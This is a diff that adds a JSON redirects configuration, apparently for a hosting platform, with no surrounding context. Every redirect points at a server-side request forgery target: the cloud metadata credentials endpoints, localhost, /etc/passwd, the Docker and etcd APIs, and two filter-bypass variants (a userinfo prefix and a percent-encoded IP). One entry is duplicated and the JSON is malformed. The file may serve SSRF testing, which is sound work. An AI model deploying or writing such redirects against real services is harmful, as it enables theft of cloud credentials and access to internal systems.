@@ -1,0 +1,13 @@
+{
+  "redirects": [
+    { "source": "/a", "destination": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "permanent": true },
+    { "source": "/b", "destination": "http://127.0.0.1", "permanent": true },
+    { "source": "/c", "destination": "file:///etc/passwd", "permanent": true },
+    { "source": "/d", "destination": "http://vercel.com@169.254.169.254/latest/meta-data/iam/security-credentials/", "permanent": true },
+    { "source": "/e", "destination": "http://[::1]:2375/containers/json", "permanent": true },
+    { "source": "/f", "destination": "http://[::1]:2375/containers/json", "permanent": true },
+    { "source": "/g", "destination": "http://169.254.169.254/metadata/v1.json", "permanent": true },
+    { "source": "/h", "destination": "http://127.0.0.1:2379/version", "permanent": true },
+    { "source": "/i", "destination": "http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34", "permanent": true },
+  ]
+}
